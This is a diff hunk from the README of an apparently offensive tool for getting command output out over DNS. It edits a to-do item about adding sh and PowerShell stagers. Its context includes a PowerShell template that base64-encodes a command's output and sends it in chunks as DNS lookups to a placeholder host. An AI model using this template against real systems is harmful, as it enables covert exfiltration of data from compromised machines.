@@ -101,7 +101,7 @@ A workaround to avoid running into issues for the aforementioned cases is to fir
 
 ### Todos
  - ~~we could achieve constant command length by sending initially a "stager" command, which will then get our full command through DNS responses.~~ (done for bash)
- - Add stagers for sh, powershell
+ - Add stagers for sh (maybe a massage of the bash stager), powershell (maybe something like [this](https://github.com/no0be/DNSlivery/blob/master/dnslivery.py#L136))
  - procroustes_full/powershell command can use some parallelization:
  ```bash
 [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((%CMD%)+(echo "`n%SIGNATURE%"))) -split '(.{1,%CHUNK_SIZE%})'|?{$_}|%{$i+=1;%DNS_TRIGGER% $('{0}{1}{2}' -f ($_ -replace '(.{1,%LABEL_SIZE%})','$1.'),$i,'%UNIQUE_DNS_HOST%')}
